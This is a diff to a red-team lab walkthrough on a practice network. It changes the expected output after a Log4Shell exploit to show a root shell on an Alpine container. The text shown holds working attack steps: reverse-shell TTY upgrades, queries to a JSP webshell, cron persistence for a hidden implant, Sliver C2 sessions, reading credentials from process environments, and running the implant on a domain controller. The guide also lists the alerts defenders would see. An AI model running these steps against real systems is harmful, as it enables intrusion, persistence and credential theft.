@@ -278,21 +278,23 @@ curl -s http://10.0.0.100:8080/ \
 
 **Back in Terminal 1 — shell appears within 2-3 seconds:**
 ```
-Connection received on 192.168.10.100 XXXXX
-bash: no job control in this shell
-www-data@web01:/opt/spring-boot$
+connect to [10.0.0.5] from (UNKNOWN) [10.0.0.100] XXXXX
+/bin/sh: can't access tty; job control turned off
+/ #
 ```
 
 **Verify your position:**
 ```bash
 [WEB01]
 id
-# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# uid=0(root) gid=0(root) groups=0(root),...
 whoami
-# www-data
+# root
 hostname
 # web01
 ```
+
+> The container runs as **root** (not `www-data`). Alpine Linux, no Python, no bash.
 
 **Forensic artifact created (irreversible):** Tomcat access log writes the raw `${jndi:}` string:
 ```
@@ -302,7 +304,7 @@ This log entry survives even if you delete bash history, kill the implant, or ov
 
 **SIEM alerts fired:**
 - Zeek HTTP: `Log4Shell JNDI string in X-Api-Version header` — **CRITICAL**
-- Sysmon EID 1: `java spawned bash` — **CRITICAL**
+- Sysmon EID 1: `java spawned sh` — **CRITICAL**
 
 **If the shell doesn't land:**
 ```bash
@@ -340,25 +342,23 @@ whole shell. Upgrade to a proper PTY:
 
 ```bash
 [WEB01 — raw reverse shell]
-# Spawn a Python PTY — creates a proper terminal session
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Now you have a bash prompt but it's still half-raw
+# WEB01 is Alpine — no Python, no bash. Use `script` (busybox built-in) to spawn a PTY.
+script -qc /bin/sh /dev/null
+# Now you have a sh prompt with job control
 
-# Press Ctrl+Z to background the shell (it stays running in Kali's nc)
+# Press Ctrl+Z to background the shell
 ```
 
 ```bash
 [KALI]
-# Set raw mode on Kali terminal — passes all keystrokes including Ctrl+C to the shell
+# Set raw mode — passes all keystrokes including Ctrl+C to the remote shell
 stty raw -echo
-# Then bring the shell back to foreground
 fg
 # Press Enter once
 ```
 
 ```bash
 [WEB01 — now a proper PTY]
-# Set terminal dimensions so vim/less work correctly
 export TERM=xterm
 stty rows 50 cols 200
 ```
@@ -425,8 +425,8 @@ curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id%3Bwhoami%3Bhostnam
 
 **Expected:**
 ```
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data
+uid=0(root) gid=0(root) groups=0(root),...
+root
 web01
 ```
 
@@ -466,7 +466,7 @@ ls -lh /tmp/.cache/rxphage
 file /tmp/.cache/rxphage
 # ELF 64-bit LSB executable, x86-64, statically linked
 
-# Install cron persistence for www-data
+# Install cron persistence
 # @reboot runs once at startup — survives container/VM restarts
 (crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -
 
@@ -490,13 +490,13 @@ sliver > sessions
 **Expected — beacon appears within 60 seconds (default check-in interval):**
 ```
 ID  Name   Transport  RemoteAddress            Hostname  Username  OS/Arch         Last Message
-1   WEB01  https      192.168.10.100:43221     web01     www-data  linux/amd64     3s ago
+1   WEB01  https      192.168.10.100:43221     web01     root      linux/amd64     3s ago
 ```
 
 ```bash
 sliver > use 1          # or: use WEB01
 sliver (WEB01) > whoami
-# www-data
+# root
 
 sliver (WEB01) > ifconfig
 # eth0   10.0.0.100/24
@@ -603,7 +603,7 @@ nmap -sV -p 135,139,389,445,636,3389,5985,5986 \
 **Why this works:** The `dragonrx_web01` container connects to Active Directory LDAP for user
 authentication. Docker Compose passes those credentials via environment variables. In Linux, every
 process's environment variables are readable at `/proc/PID/environ` — including by the process itself
-(and by root, or by the www-data user reading its own process).
+(and by root — which we are).
 
 ```bash
 [WEB01]
@@ -1184,7 +1184,7 @@ start /b C:\Temp\rxphage.exe
 sliver > sessions
 # Should now show a DC01 session
 # ID  Name   Transport  RemoteAddress         Hostname  Username           OS/Arch
-# 1   WEB01  https      192.168.10.100:xxxxx  web01     www-data           linux/amd64
+# 1   WEB01  https      192.168.10.100:xxxxx  web01     root               linux/amd64
 # 2   DC01   https      192.168.10.10:xxxxx   DC01      NT AUTHORITY\SYSTEM windows/amd64
 
 sliver > use 2       # use the DC01 session
@@ -1513,7 +1513,7 @@ rmdir /s /q C:\Temp\RansomTest    2>nul
 
 ```
 INITIAL ACCESS
-  Log4Shell (CVE-2021-44228) via X-Api-Version header → www-data@web01
+  Log4Shell (CVE-2021-44228) via X-Api-Version header → root@web01
 
 FOOTHOLD (two independent channels)
   ├── JSP webshell: /resources/imgs/cache.jsp
